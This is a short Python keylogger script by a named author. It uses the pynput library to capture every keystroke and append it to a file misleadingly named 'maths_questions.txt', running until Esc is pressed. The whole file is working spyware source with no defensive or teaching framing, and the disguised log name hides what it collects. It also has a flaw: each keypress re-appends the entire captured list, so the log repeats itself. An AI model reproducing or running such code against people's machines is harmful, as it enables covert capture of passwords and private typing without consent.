from pynput.keyboard import Key, Listener

k = []

def on_press(key):
    k.append(key)
    write_1(k)
    print(key)

def write_1(var):
    with open("maths_questions.txt", "a")as f:
        for i in var:
            new_var = str(i).replace("'", "")
            f.write(new_var)
            f.write(",")

def on_release(key):
    # code by Varun Banka
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()